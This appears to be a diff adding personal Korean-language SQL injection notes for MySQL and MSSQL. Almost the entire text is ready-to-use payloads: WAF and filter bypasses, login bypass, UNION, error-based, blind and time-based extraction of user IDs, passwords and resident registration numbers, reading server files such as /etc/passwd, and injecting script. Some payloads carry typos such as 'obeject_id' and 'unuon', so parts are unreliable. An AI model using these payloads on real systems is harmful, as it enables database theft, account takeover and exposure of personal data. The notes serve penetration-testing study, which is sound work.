@@ -1,0 +1,700 @@
+------------------인젝션 ------------------------
+
+***** 주의사항 *****
+	--, or 연산자 사용 조심 업데이트 이런거 절대X
+
+[[[ 기초 , 공통 ]]]	
+
+- 취약점 분석(에러유무, 취약유무, 조건구문체크) -> DBMS 파악 -> 공격선택 -> 데이터조회시 DB데이터 웹페이지 출력 확인 -> UNION -> ORDER BY 구문실행확인 -> UNION 구문 실행확인 ->출력포지션 확인 -> 공격시작 -> 목록화
+																-> DMBS 에러 출력 -> ERROR -> 공격 페이로드 검증 -> 목록화
+																-> BLIND -> 기준문자 체크 -> CONTENTBASED -> 순차/이진/비트단위
+																		 -> 응답 메시지 -> REPONSED -BASED -> ..
+																		 -> TIMEBASED
+
+- 에러 유무 파악(+DBMS): TEST , TE' 'ST / TE'+'ST / TE'||'ST, TE'A'ST 에러 확인
+
+- 취약점 유무 파악: 문자형 TE' 'ST / TE'+'ST / TE'||'ST -> 제거되는 상황 고려 case when
+				숫자형 idx=192-1
+				테이블 tbname=notice+where+1=1--
+				컬럼 se_title=tqtq 에러, se_title=1 참 (-> where tqtq like '%%')
+				컬럼(order by) sort_column=a 에러, sort_column=1 참 (->order by a desc)
+				키워드(order by) ORDER BY idx, 1 참 / ORDER BY idx, a 에러 (sort=,1 참, sort=a 거짓)				
+
+- 조건 구문 완성: hacker'+and+1=1+and+'1'='1
+				hacker%25'+and+1=1+and+'%25'='
+				192+and+1=1--
+
+- prepared statement 조건 구문: tbname=(select * from members where 1=1)&keyword='kwon' 
+							   -> 테이블 유추 필요, from이 아니라 where인 경우도 존재하니 확정x
+
+- DB2: select 1 from sysibm.sysdummy1
+
+- DB 데이터가 웹페이지 출력 -> UNION
+
+- 보안 솔루션
+	URL 인코딩 우회
+	burp -> convert select -> url ->. url-encdoe all charters
+	
+	NULL BYTE 문자 삽입
+	'and%00ascii(substring(@@version,1,1))&1=1--
+	'+and%001%3d1--
+	
+	https 프로토콜 사용
+	
+	HPP(HTTP Parameter pollution) 기법((ASP.NET, IIS), (ASP/IIS))
+	boardView.do?idx=100/*&idx=*/and /*&idx=*/ ascii/*&idx=*/(substring(/*&idx=*/@@version,1,1))&/*&idx=*/1=1--
+		post /test.aspx?val=1&val=2 
+		cookie: val=5;val=6
+		val=3&val=4
+	
+	HPF(HTTP Parameter Fragmentation)
+	keyword=' and ascii(substring/*&sort=*/(@@version,1,1))&1=1--
+		-> %' order by 날림
+	
+	싱글쿼터 문자 검증 우회
+	1) boardView.do?idx=100 - 참
+	2) boardView.do?idx=100 and 1=1 - 참
+	3) boardView.do?idx=100 and ~~~ where id='admin' ~~ - 차단
+	4) boardView.do?idx=100 and substring('test',1,1)='t' - 싱글쿼터 테스트 - 차단
+	100 and 1=1 --
+	
+	MYSQL (char 함수) 
+	- concat(char(97),char(100),char(109),char(105),char(110)) ->admin // 버프에서 CONVERT SELECTION-> constructstring 하면 자동
+	- char(97,100,109,105,110)
+	- 0x61646d94d6e
+	MSSQL (char) - char(97)+char(100)+char(109)+char(105)+char(110)
+	oracle (chr) - chr(97)||chr(100)||chr(109)||chr(105)||chr(110)
+	
+	공백 문자 검증 우회
+	1) boardView.do?idx=101-1 - 참  | 공백제거 - 참
+	2) boardView.do?idx=101 -1 - 차단  | 공백제거 - 참
+	3) boardView.do?idx=100 and 1=1 - 차단 | 공백제거 - 에러
+	4) boardView.do?idx= 100 - 차단(이거만 참일경우 trim 함수 사용(전체 문자열 양옆 공백제거))  | 공백제거 - 참
+	%09, %0A, %0B, %0C, %0D, %A0 ,(%00), /**/
+	idx=100/**/and%091=1
+	
+	= 문자 검증 우회
+	1) boardView.do?idx=101-1 - 참
+	2) boardView.do?idx=100 and 1=1 - 차단
+	3) boardView.do?idx=100 or 1=1 - 차단
+	idx=100 and 1 in(1)
+	idx=100 and 1 like 1
+	idx=30+and+substring(@@version,1,1)like'M'
+	
+	함수 검증 우회 기법
+	1) idx=100 and ascii(substring(@@version,1,1))&1=1-- -> 차단 (ascii, substring)
+	2) idx=100 and ascii('a')=97--	-> 참
+	3) idx=100 and substring('test',1,1)='t'-- -> 차단 (substring 이 범인)
+	3_1) idx=100 and substring('test',1,1)='t'-- -> 참 (ascii + substring 동시쓰면 차단)
+		%09, %0A, %0B, %0C, %0D, %A0 ,(%00), /**/
+		idx=100 and substring%09(%A0'test',1,1)='t'--
+		MYSQL - substring , substr, mid, (left+right)
+		MSSQL - substring, (left+right)
+		Oracle - substr, (left+right), [right(left([DATA],N),1) , left('test',3) -> tes , right('tes',1) -> s]
+
+	기타 우회 기법
+	대문자사용
+		' and AsCii(suBStRinG(@@vErSiOn,1,1))&1=1--
+	%문자 사용
+		' and as%cii(subs%tring(@@v%ers%ion,1,1))&1=1-- (iis 의 경우 간혹존재)
+	키워드 중복 사용
+		'and asasciicii(subssubstringtring(@@version,1,1))&1=1-- (제거 처리될경우 가능)
+	암호화 채널 사용
+		HTTPS, 터널링(VPN, SSH(서버를 장악한 후 강제로 올리는겨웅도 존재) 등등)
+		SSH- A 웹방화벽 -> A 웹서비스(장악 - A웹방화벽 안거치고 접근) -> B 웹방화벽 (이게 있을경우 막히나 별로X) -> B웹서비스 
+	
+- 파일 다운로드 기법 SQL INJECTION
+	idx=100 and 1=2 union select '../../../../etc/passwd'
+	idx=100 and 1=2 union select version(), '../../../etc/passwd'
+	idx=1+union+select+null,null
+	idx=123563446+union+select+'success.txt','../../../../../etc/passwd'
+	= idx=1+and+1=2+union+select+'success.txt','../../../../../etc/passwd'
+	
+	idx=2623634+union+select+version(),'../download.php' -> content-dispostiion 에 출력
+	idx=2623634+union+select+(select+table_name+from+information_schema.tables+where+table_schema='board'+limit+0,1),'../download.php'
+	idx=2623634+union+select+(select+group_concat(id)+from+members),'../download.php'
+		-> 없는 파일 확인할시 에러 또는 파일 찾지못한다
+	idx=1+and+substring((select+real_filename+from+file_list+limit+0,1),1,1)='c'
+	idx=1+and+substring((select+real_filename+from+file_list+limit+0,1),2,1)='c'
+
+- SQL 인젝션 통한 XSS
+	idx=23+and+1=2+union+select+null,null,null,null,null%23
+	idx=23+and+1=2+union+select+null,'test',null,null,null%23
+	idx=23+and+1=2+union+select+null,'<script>alert("test")</script>',null,null,null%23
+	
+	title='%2b'a'%2b'
+	title='%2b'<script>alert("test")</script>'%2b'
+	title='%2b'char(60)%2bchar(115)%2b....char(62)'%2b'
+
+- 인젝션을 통한 파라미터 변조
+	where id='$_SESSION["id"]' and idx={$idx}
+		- id = tester2 and idx=6 or idx=1 
+	
+	select * from member where idx={$idx};
+	if($_SESSION["id"]!=$user["id"]
+		idx=2 or idx=1 -> 1번+2번출력 -> $user[id]는 1번 세션은 2번이라 에러체크
+		idx=2 order by 4
+		idx=2 union select null,null,null,null -> 1번은 idx=2번꺼, 2번은 null값 추출
+		idx=2 and 1=2 union select null,null,null,null -> 에러체크 
+		idx=2 and 1=2 union select null,'tester',null,null -> 내꺼로 조회 가능(두번쨰가 id 컬럼)
+		idx=2 and 1=2 union select null,'tester',table_name,null from information_schema.tables where table_schema=database() limit 0,1
+		-> members
+		idx=2 and 1=2 union select null,'tester',column_name,null from information_schema.columns where table_schema=database() and table_name='members' limit 0,1
+		idx=2 and 1=2 union select idx,'tester',id,null from members where idx=1
+
+		idx=2 and 1=2 union select null,'tester',group_concat(table_name),null from information_schema.tables where table_schema=database()
+		idx=2 and 1=2 union select null,'tester',group_concat(column_name),null from information_schema.columns where table_schema=database() and table_name='members'
+		idx=2 and 1=2 union select idx,'tester',id,null from members where idx=1
+	
+[[[ MYSQL ]]]
+
+- CASE WHEN 조건 구문
+	idx=(case when 1=1 then 9 else 3 end)
+	sort_column=(case when 1=1 then idx else title end) -> 에러x
+	title=(case when 1=1 then test then tesn end)
+*	sort_column=&sort=(case whel 1=1 then idx else title end)
+	sort_column=idx&sort=(case whel 1=1 then ASC else DESC end)
+
+- 검색 컬럼을 이용한 조건 구문
+	serch_type='test'&keyword=test 참/거짓 serch_type='test2'&keyword=test
+	serch_type=(case+when+1=1+then+'test'+else+'ha'+end)&keyword=test
+							
+- 인증 우회 
+	id=' or 1=1 or ''='
+	' or id='admin'#
+	id='guest' and no=-1 or id=0x63463463 (admin hex값) -> 싱글쿼터 우회
+	pw='or/**/id='admin -> 공백 우회
+	pw='|| id='admin -> or, and 우회 , oracle 연결연산자||아님
+	pw='&& id='admin
+	idx=6--
+	pw='' or idx=6 -- idx를 뒤에 다시 적기(이래야 6일때만 참)
+	
+	id 입력칸 - ' union select 'admin', md5('admin')#
+	pass 입력칸 - 'admin'
+	
+- dbms 파악
+	idx=7 and 'test='te' 'st' , te'd'st 는 에러
+	idx=7 and mid('test',1,1)='t' 
+	now(), *mid()*, length()
+	에러파악: ' 로 에러 유발
+
+- 순차적 레코드 출력
+	select count(id) from members;
+	select id from members limit 0, 1;
+	select id from members limit 1, 1;
+
+- 메타데이터 목록화 순차적
+	select schema_name from information_schema.schemata - db명 검색
+	select table_name from information_schema.tables where table_schema='board' - 테이블 검색
+	select * from information_schema.columns where table_schema='board' and table_name='members';
+	select id, password, jumin from board.members;
+
+- 메타데이터 목록화 비순차적
+	select table_name from information_schema.tables where table_schema='board' and table_name like '%mem%';
+	select column_name from information_schema.columns where table_schema='board' and table_name='members' and column_name like '%id%';
+	select table_name, column_name from information_schema.columns where table_schema='board' and column_name like '%id%'
+	select id, password from board.members;
+	
+- ERROR-BASED 순차적
+	extractvalue(0x0a,concat(0x0a,@@version))
+	updatexml(0x0a,concat(0x0a,@@version),0x0a) -> xml 에러내 @@version 정보 추가
+	(select 1 from(select count(*),concat(@@version,floor(rand(0)*2))as a from (select 1 union select 2 union select 3)x group by a)x) -> group by 에러 내 @@version 추가
+	
+	extractvalue(0x0a,concat(0x0a,(select+schema_name+from+information_schema.schemata+limit+0,1),0x0a))
+	extractvalue(0x0a,concat(0x0a,(select+schema_name+from+information_schema.schemata+limit+7,1),0x0a))
+	extractvalue(0x0a,concat(0x0a,(select+table_name+from+information_schema.tables+where+table_schema%3d'board'+limit+0,1),0x0a))
+	extractvalue(0x0a,concat(0x0a,(select+column_name+from+information.schema.columns+where+table_schema%3d'board'+table_name%3d'member'+limit+0,1),0x0a))
+	extractvalue(0x0a,concat(0x0a,(select+concat(id,'%23',password,'%23',jumin)+from+board.member+limit+0,1),0x0a))
+
+- ERROR-BASED 비순차적
+	extractvalue(0x0a,concat(0x0a,(select+count(*)+from+information_schema.tables+where+table_schema%3d'board'+and+table_name+like+'%25mem%25'),0x0a))
+	extractvalue(0x0a,concat(0x0a,(select+table_name+from+information.schema.tables+where+table_schema%3d'board'+and+table_name+like+'%25mem%25'+limit+0,1),0x0a))
+	extractvalue(0x0a,concat(0x0a,(select+column_name+from+information.schema.columns+where+table_schema%3d'board'+and+table_name%3d'member'+limit+0,1),0x0a))
+	extractvalue(0x0a,concat(0x0a,(select+count(*)+from+information.schema.columns+where+table_schema%3d'board'+table_name%3d'member'+column_name+like+'%25jumin%25'),0x0a))
+	extractvalue(0x0a,concat(0x0a,(select+column_name+from+information.schema.columns+where+table_schema%3d'board'+and+table_name%3d'member'+column_name+like+'%25jumin%25'+limit+0,1),0x0a))
+	extractvalue(0x0a,concat(0x0a,(select+concat(table_name,'%23%23',column_name)+from+information.schema.columns+where+table_schema%3d'board'+and+column_name+like+'%25jumin%25'+limit+0,1),0x0a))	
+		-> 테이블 모를때
+
+- UNION BASE 공격
+	 mysql의 특성 -> terminating을 필수
+	' order by 8# - 7개
+	' UNION select null,null,null,null,null,null,null#
+	' and 1=2 UNION select 'test',null,null,null,null,null,null#
+	' and 1=2 union select concat(version(),'#',system_user(),'#',database()),null,null,null,null,null,null#
+	' and 1=2 union select all null,schema_name,null,null,null null from information_schema.schemata#
+	' and 1=2 union select all null,table_name,null,null,null,null from information_schema.tables where table_schema='board'#
+	' and 1=2 union select all null,column_name,null,null,null,null from information_schema.columns where table_schema='board' and table_name='members'#
+	' and 1=2 union select all id,password,null,jumin,null,null,null from board.members#
+	
+	아이디 중복 조회 공격
+	id=guest'+order+by+3+%23 - 에러 2개
+	id='+union+select+null,null%23
+	id='+union+select+'ha',null%23
+	id='+union+select+concat(version(),database(),system_user())+null%23
+	id='+union+select+schema_name+null+from+information_schema.schemata+limit+0,1%23
+	id='+unuon+select+table_name+null+from+information_schema.tables+where+table_schema='login'+limit+2,1%23
+	id='+union+select+column_name+null+from+information_schema.columns+where+table_schema='login'+and+table_name='members'+limit+0,1%23
+	id='+union+select+concat(id+'%23'+pass)+null+from+login.members+limit+0,1%23
+	
+	mysql UNION 통하여 로컬 파일 열람
+	' and 1=2 union select null,file_priv,null ~ from mysql.user where user='root'# file_priv 권한이 y 여야 가능
+	' and 1=2 union select null,load_file('/apm_setup/htdocs/board/common.php'),null,null,null,null,null #
+	
+- BLIND BASED 공격 (Content-based)
+	substring([DATA],N,1)='a'
+	substr([DATA],N,1)='a'
+	mid([DATA],N,1)='a'
+	
+	데이터 추론 기법 Sequential Search (순차탐색)
+	search_type=substring(system_user(),1,1)='a'+and+title&keyword=test 
+	search_type=substring(version(),1,1)='a'+and+title&keyword=test 
+	search_type=substring(database(),1,1)='a'+and+title&keyword=test 
+	search_type=length((select+count(*)+from+information_schema.tables+where+table_schema%3d'board'+table_name+like+'%25mem%25'+limit+0,1))>5+and+title~
+	search_type=substring((select+table_name+from+information_schema.tables+where+table_schema%3d'board'+table_name+like+'%25mem%25'+limit+0,1),1,1)='a'+and+title~
+	search_type=substring((select+column_name+from+information_schema.columns+where+table_schema%3d'board'+table_name%3d'members'+column_name+like+'%25jumin%25'+limit+0,1),1,1)='a'+and+title~
+	search_type=length(select+jumin+from+board.members+where+table_schema%3d'board'+and+table_name%3d'members'+column_name%3d'jumin'+limit+0,1)>10 and title
+	
+	데이터추론 -이진탐색(binary search) 아스키 32~126
+	ascii(substring((select pw from member where id='admin'),1,1))>80 
+	select * from member where id='guest' and ascii(substring((select pw from member where id='admin'),2,1))>50
+	idx=25+and+length((select+database()))>2
+	25+and+ascii(substr((select+database()),1,1))>80
+	idx=25+and+length((select+password+from+board.tb_board+where+idx=62))=4
+	idx=25+and+ascii(substr((select+password+from+tb_board+where+idx=62),1,1))=92
+	
+	데이터 추론 비트 단위(bit by bit search)
+	N은 1,2,4,8,16,32,64
+	ascii(substring((select pw from member where id='admin'),1,1))&1=1 -TRUE
+	ascii(substring((select pw from member where id='admin'),1,1))&2=2 - FALSE
+	ascii(substring((select pw from member where id='admin'),1,1))&64=64 -TRUE
+		-> 01100001 - 'a'
+	test%25'+and+ascii(substring(system_user(),1,1))%261=1+and+'%25'=' // %26 - &
+	test%25'+and+ascii(substring(system_user(),1,1))%264=4+and+'%25'='
+	keyword=test%25'+and+ascii(substring(select+table_name+from+information_schema.tables+where+table_schema%3d'board'+table_name+like+'%25mem%25'+limit+0,1),1,1)%261%3d1+and+'%25'='
+	keyword=test%25'+and+ascii(substring(select+table_name+from+information_schema.tables+where+table_schema%3d'board'+table_name+like+'%25mem%25'+limit+0,1),1,1)%262%3d2+and+'%25'='
+
+- Response-based Blind sql
+	Divide by zero - MYSQL은 에러X
+	(CASE+WHEN+1=1+THEN+1/0+else+1+end)
+	
+	다중 레코드가 반환되는 서브 쿼리
+	문자형 - CASE WHEN 1=1 THEN 'TEST' ELSE (select 'a' union select 'b') END;
+	숫자형 - CASE WHEN [] THEN 1 ELSE (select 1 union select 2) END
+	' and 1=(select 1 union select 2)#
+	' and 1=(case when 1=1 then 1 else (select 1 union select 2) end)#
+	' and 1=(case when length(system_user())>0 then 1 else (select 1 union select 2) end)#
+	' and 1=(case when length(system_user())>3 then 1 else (select 1 union select 2) end)#
+	...
+	' and 1=(case when substring(system_user(),1,1)='a' then 1 else (select 1 union select 2) end)#
+	' and 1=(case when ascii(substring(system_user(),1,1))>70 then 1 else (select 1 union select 2) end)#
+	...
+	' and 1=(case when system_user()='root@localhost' then 1 else (select 1 union select 2) end)#
+	
+	order by 구문 공격 * prepared statement 가 안되는 부분
+	sort_column=title&sort=desc
+	sort_column=(CASE+WHEN+1=1+THEN+(select+'a'+union+select+'b')+end)&sort=desc -> 에러
+	sort_column=(CASE+WHEN+1=2+THEN+(select+'a'+union+select+'b')+end)&sort=desc -> 참
+	sort_column=(CASE+WHEN+length(databases())>5+THEN+(select+'a'+union+select+'b')+end)&sort=desc
+	...
+	sort_column=(CASE+WHEN+databases()='board'+THEN+(select+'a'+union+select+'b')+end)&sort=desc
+	sort_column=(CASE+WHEN+1=1+THEN+1/0+end)&sort=desc
+	
+- 	time based * 가용성 문제 발생 가능성 존재
+	CASE WHEN [조건] THEN 'test' ELSE SLEEP(5) END
+	CASE WHEN [조건] THEN 'TEST' ELSE benchmark(10000000, md5('crehacktive')) END -> 시간 예측불가
+	' and 1=SLEEP(2)# - select 결과가 없으면 반응하지 않음
+	' union select 1,sleep(2),3,4,5,6,7#
+	password=te'%20'st -> 가능성존재
+	test'and+1=sleep(2)%23 -> 2초걸림
+	test'and+1=(case+when+1=2+then+sleep(2)+else+1+end)%23
+	test'and+1=(case+when+database()='board'+then+sleep(2)+else+1+end)%23
+
+- 그룹핑 조회
+	SELECT group_concat(schema_name,'###') from information_schema.schemata;
+
+- INSERT, UPDATE, DELETE 
+	
+	***** 주의사항 *****
+		--, or 연산자 
+		
+	(연결x, 사칙연산(/ ,*, + ,-))
+	INSERT INTO board VALUES ('DATA', ''/extractvalue(1,concat(0x01,version()))/'','DATA')
+		->'/extractvalue(1,concat(0x01,version()))/' 입력
+	UPDATE board SET title='DATA', content=''/extractvalue(1,concat(0x01,version()))/''... where idx=100
+		 '/extractvalue(1,concat(0x01,version()))/'
+	UPDATE board SET title='', content=''... where idx=extractvalue(1,concat(0x01,version()))
+	DELETE FROM board where idx=extractvalue(1,concat(0x01,version()))
+	
+	
+[[[ MSSQL ]]]
+
+- CASE WHEN 조건 구문
+	idx=(case when 1=1 then 9 else 3 end)
+	id='+(case when 1=1 then 'true' else 'false' end)+'
+	sort_column=(case when 1=1 then idx else title end) -> 거짓일경우 에러발생(자료형) 참/에러 공격가능
+*	title=te'+(case when 1=1 then 's' then 'n' end)+'t (논리연산자(and), terminate 필터링)
+	sort_column=idx&sort=(case whel 1=1 then ASC else DESC end)
+
+- 검색 컬럼을 이용한 조건 구문
+	serch_type='test'&keyword=test 참/거짓 serch_type='test2'&keyword=test
+	serch_type='te'%2b'st'&keyword=test
+	serch_type=(case+when+1=1+then+'test'+else+'ha'+end)&keyword=test
+
+- 인증 우회
+	id=' or 1=1 or ''='
+	' or id='admin'--
+	pw='or/**/id='admin -> 공백 우회
+	idx=6--
+	pw='' or idx=6 -- idx를 뒤에 다시 적기(이래야 6일때만 참)
+	
+	id 입력칸 - ' union select 'admin', md5('admin')#
+	pass 입력칸 - 'admin'
+	
+- dbms 파악
+	te' 'st -> 에러, te'+'st
+	idx=7 and 'te'%2b'st'='test'
+	idx=5 and len('test')=4
+	getdate(), substring(), len()
+	에러파악: ' 로 에러 유발
+
+- 순차적 레코드 출력
+	select count(id) from members;
+	select id from members limit 0, 1;
+	select id from members limit 1, 1;
+	select top 1 name from (select top 4 name from sys.databases order by name desc)a order by name asc - 정렬이용
+	select top 1 name from sys.databases where name not in(select top 0 name from sys.databases) - not in 이용
+	select name from (select row_number() over(order by name) num, name from sys.databases)a where a.num=4 -> row_number
+	
+- 메타데이터 목록화 순차적
+	select name, database_id from master.sys.databases
+	select db_name(1);
+	select object_id, name from board.sys.objects where type='U' 
+	select * from board.sys.columns where object_id=(select object_id from board.sys.objects where name='members' and type='U') 
+	select * from board.sys.columns where obeject_id=object_id('board..members')
+	select id, password from board..members
+	select name, type_name(system_type_id) from board.sys.colums where obeject_id=object_id('members') -자료형 같이 뽑기
+
+- 메타데이터 목록화 비순차적
+	select name from sys.objects where type='U' and name like '%mem%'
+	select name from sys.columns where obeject_id=obeject_id('members');
+	select name from sys.columns where object_id in(select obeject_id from sys.objects where type='U') and name like '%id%'
+	select object_name(object_id),name from sys.columns where object_id in(select obeject_id from sys.objects where type='U') and name like '%id%' - 테이블네임+컬럼
+	select object_name(object_id, db_id('board')),name from board.sys.columns where object_id in(select obeject_id from board.sys.objects where type='U') and name like '%id%'
+		-> 다른 db 보기
+
+- ERROR-BASED 순차적
+	1=version, 1=0/@@version, 1=convert(int,@@version) -> 형변환 에러
+	
+	keyword=test%25'+and+1=@@version+and+'%25'='
+	keyword=test%25'+and+1=system_user+and+'%25'='
+	keyword=test%25'+and+1=db_name()+and+'%25'='
+	keyword=test%25'+and+1='%23%23'%2bconvert(char,(select+count(*)+from+master.sys.databases)%2b'%23%23'+and+'%25'='
+	keyword=test%25'+and+1='%23%23%23'%2b(select+top+1+name+from+board.sys.objects+where+type%3d'U'+and+name+not+in(select+top+0+name+from+board.sys.objects+where+type%3d'U'))+and+'%25'='
+	keyword=test%25'+and+1=(select+top+1+name+from+board.sys.columns+where+obeject_id=obeject_id('board..members')+and+name+not+in(select+top+0+name+from+board.sys.columns+where+obeject_id=obeject_id(board..members))+and+'%25'='
+	keyword= test%25'+and+1='%23%23'%2b(select+top+1+id%2b'%23%23%23'%2bpassword+from+board..members+where+id+not+in(select+top+0+id+from+board..members))+and+'%25'='
+
+- ERROR-BASED 비순차적
+	test%25'+and+1='%23%23%23'%2b(convert(char,(select+count(*)+from+board.sys.objects+where+type%3d'U'+and+name+like+'%25mem%25')))+and+'%25'='
+	keyword=test%25'+and+1='%23%23%23'%2b(select+top+1+name+from+board.sys.objects+where+type%3d'U'+and+name+like+'%25mem%25'+and+name+not+in(select+top+0+name+from+board.sys.objects+where+tyep%3d'U'+and+name+like+'%25mem%25'))+and+'%25'='
+	keyword=test%25'+and+1='%23%23'%2b(select+top+1+object_name(obeject_id,db_id('board'))%2b'%23%23'%2bname+from+board.sys.columns+where+object_id+in(select+obeject_id+from+board.sys.objects+where+type%3d'U')+name+like+'%25jumin%25'+and+name+not+in+(select+top+0+name+from+board.sys.columns+where+obeject_id+in(select+obeject_id+from+board.sys.objects+where+type%3d'U')+and+name+like+'%25jumin%25'))+and+'%25'='
+	(select+a.name%2b'%23%23'%2bb.name+from+board.sys.objects+a,+board.sys.columns+b+where+a.obeject_id%3db.obeject_id+and+a.type%3d'U'+and+b.name+like+'%25jumin%25'+and+name+not+in(select+top+0+b.name+from+board.sys.objects+a,+board.sys.columns+b+where+a.type%3d'U'+and+a.object_id%3db.obeject_id+and+b.name+like+'%25jumin%25'))+and+'%25'='
+
+- UNION BASE 공격
+	대용량 - TEXT, NTEXT, IMAGE...
+	
+	' order 7 by -- 에러 , 8이 대용량가능성 존재
+	' union all select null,null,null,null,null,null,null--  대용량 -> union all
+	' and 1=2 union all select null,'test',null,'test',null,null,null-- 
+	' and 1=2 union all select null,@@version+','+system_user+','+db_name(),null,'test',null,null,null-- 
+	' and 1=2 union all select null,db_name(2),null,null,null,null,null -- 한개씩
+	' and 1=2 union all select null,name,null,null,null,null,null from master.sys.databases --
+	' and 1=2 union all select null,name,null,null,null,null,null from board.sys.objects where type='U' --
+	' and 1=2 union all select null,name,null,null,null,null,null from board.sys.columns where obeject_id=obeject_id(board..members)--
+	' and 1=2 union all select null,concat(id,'##',password,'##',jumin),null,null,null,null,null from board..members --
+	+아이디 중복 조회 공격
+
+- BLIND BASED 공격 (Content-based)
+	substring([DATA],N,1)='a'
+	
+	데이터 추론 기법 Sequential Search (순차탐색)
+	search_type=substring(system_user,1,1)='a'+and+title&keyword=test
+	search_type=substring(system_user,2,1)='a'+and+title&keyword=test 
+	search_type=(select count(*) from sys.columns where object_id in(select obeject_id from sys.object where type='U') and name like '%jumin%')=1+and+title~
+	search_type=len(select object_name(obeject_id) from sys.objects where obeject_id in(select obeject_id from sys.objects where type='U')and name like '%mem%')>1+and+title&keyword=test
+	search_type=substring((select object_name(object_id) from sys.objects where obeject_id in(select obeject_id from sys.obejects where type='U')and name like '%mem%'),1,1)='a'+and+title
+	(select count(*) from sys.columns where obeject_id=obeject_id('members') and name like '%jumin%')
+	search_type=len(select name from (select row_number() over(order by name) r, name from sys.columns where obeject_id=obeject_id('members') and name like '%jumin%')a where a.r=1)>5 and title
+	search_type=substring((select top 1 jumin from (select top 1 jumin from members order by jumin desc)a order by jumin asc),1,1)=9 and title
+		-> intruder 기능 이용 9 이용 0~9 까지 
+	
+	데이터추론 -이진탐색(binary search) 아스키 32~126
+	ascii(substring((select pw from member where id='admin'),1,1))>80 
+	select * from member where id='guest' and ascii(substring((select pw from member where id='admin'),2,1))>50
+	idx=25+and+len((select+system_user))>2
+	25+and+ascii(substring((select+system_user),1,1))>80
+	idx=25+and+len((select+password+from+board..tb_board+where+idx=62))=4
+	idx=25+and+ascii(substring((select+password+from+tb_board+where+idx=62),1,1))=92
+	
+	데이터 추론 비트 단위(bit by bit search)
+	N은 1,2,4,8,16,32,64
+	keyword=test%25'+and+1=1+and+'%25'='
+	test%25'+and+ascii(substring(system_user,1,1))%261=1+and+'%25'=' // %26 - &
+	test%25'+and+ascii(substring(system_user,1,1))%262=2+and+'%25'='
+	test%25'+and+ascii(substring(system_user,1,1))%264=4+and+'%25'='
+		
+	keyword=test%25'+and+len(substring(select+count(*)+from+sys.objects+where+type='U'+and+name+like+'%25mem%25'))>1+and+'%25'='
+	keyword=test%25'+and+ascii(substring(select+name+from+sys.objects+where+type='U'+and+name+like+'%25mem%25'),1,1)%261%3d1+and+'%25'='
+	keyword=test%25'+and+ascii(substring(select+name+from+sys.objects+where+type='U'+and+name+like+'%25mem%25'),1,1)%262%3d2+and+'%25'='
+	keyword=test%25'+and+ascii(substring(select+name+from+sys.objects+where+type='U'+and+name+like+'%25mem%25'),1,1)%264%3d4+and+'%25'='
+		-> intruder 활용
+	
+	test%25'+and+len(select+name+from(select+row_number()+over(order+by+name)+r,+name+from+sys.columns+where+obeject_id%3dobeject_id('members'))a+where+a.r%3d1)>2+and+'%25'='
+	test%25'+and+len(select+name+from(select+row_number()+over(order+by+name)+r,+name+from+sys.columns+where+obeject_id%3dobeject_id('members'))a+where+a.r%3d2)>2+and+'%25'='
+	test%25'+and+len(select+name+from(select+row_number()+over(order+by+name)+r,+name+from+sys.columns+where+obeject_id%3dobeject_id('members'))a+where+a.r%3d3)>2+and+'%25'='
+	test%25'+and+len(select+name+from(select+row_number()+over(order+by+name)+r,+name+from+sys.columns+where+obeject_id%3dobeject_id('members'))a+where+a.r%3d4)>2+and+'%25'='
+	
+	test%25'+and+1=1%26ascii(substring((select+name+from+(select+row_number()+over(order+by+name)+r,+name+from+sys.columns+where+obeject_id%3dobeject_id('members'))a+where+a.r%3d1),1,1))+and+'%25'='
+					1=1이랑 다음글자 나타내는 1 intruder
+	len(select+id+from+members+like+id+'%25admin%25')=5+and+'%25'='
+	test%25'+and+ascii(substring(select+top+1+password+from+members+where+id='admin'),1,1)%261=1+and+'%25'='
+
+- Response-based Blind sql
+	Divide by zero 
+	CASE WHEN [조건] THENN 'a' ELSE CONVERT(char, 1/0) END
+	CASE WHEN [조건] THEN 1 ELSE 1/0 END
+	
+	다중 레코드가 반환되는 서브 쿼리
+	문자형 - CASE WHEN [조건] THEN 'A' ELSE (select 'a' union select 'b') END
+	숫자형 - CASE WHEN [] THEN 1 ELSE (select 1 union select 2) END
+	'+(case when 1=1 then 'a' else (select 'a' union select 'b') end)+'
+		-> where title like '%'+(case when 1=1 then 'a' else (select 'a' union select 'b') end)+'%'
+	' and 1=1/0 -- 
+	' and 1=(select 1 union select 2) -- 
+		->where title like '%' and 1=(select 1 union select 2) --
+	' and 1=(case when system_user='aa' then 1 else (select 1 union select 2) end)--
+	' and 1=(case when system_user='aa' then 1 else 1/0 end)-- 
+		->이건 출력, 환경에 따라 랜덤
+	
+	order by 구문 공격 * prepared statement 가 안되는 부분
+		CASE WHEN [조건] THEN [문자형 컬럼] ELSE CONVERT(char, 1/0) END
+		CASE WHEN [조건] THEN [숫자형 컬럼] ELSE 1/0 END
+		키워드
+			, CASE WHEN [조건] THEN [문자형 컬럼] ELSE CONVERT(char, 1/0) END
+			, CASE WHEN [조건] THEN [숫자형 컬럼] ELSE 1/0 END
+	
+	CASE WHEN [조건] THEN [컬럼1] ELSE [컬럼2] END
+	sort_column=(CASE+WHEN+1=1+THEN+title+else+writer+end)&sort=desc -> 컬럼 추측및 확인하여
+	sort_column=(CASE+WHEN+system_user='sa'+THEN+title+else+writer+end)&sort=desc 
+	
+- 	time based * 가용성 문제 발생 가능성 존재
+	if [조건] WAITFOR DELAY '00:00:05' 
+		-> TRUE 이면 지연 , select(where)) 절에 사용되면 안됨 -> 스택쿼리 이용(;) (IIS, MS 에서만 사용가능)
+	select name from sys.obejects; if 1=1 waitfor delay '00:00:05'
+	keyword=';waitfor delay '00:00:02'--
+	keyword=';if system_user='sa' waitfor delay '00:00:02'--
+
+- 그룹핑 조회
+	FOR XML PATH(), STRING_AGG() - 2005 / 2017 이후사용가능
+	SELECT '###' + name FROM sysobjects where xtype='U' FOR XML PATH('')
+	SELECT string_agg(name, '###') as name from sysobjects where xtype='U'
+	
+	idx=(select string_agg(name,'%23') from sys.obejects where type='U')
+		board#members -> 테이블 목록 한번에 출력
+	idx=(select string_agg(name,'%23') from sys.columns where object_id=obeject_id('members'))
+	idx=(select string_agg(id%2b',,,'%2bpassword%2b',,,')+from+members)
+
+- INSERT, UPDATE, DELETE 
+	
+	***** 주의사항 *****
+		--, or 연산자 
+		
+	(연결, 형변환에러)
+	INSERT INTO board VALUES ('DATA', ''+convert(int,@@version)+'','DATA')
+		->'+convert(int,@@version)+' 입력
+	UPDATE board SET title='DATA', content=''+convert(int,@@version)+''... where idx=100
+		'+convert(int,@@version)+'
+	UPDATE board SET title='', content=''... where idx=@@version
+	DELETE FROM board where idx=@@version
+	
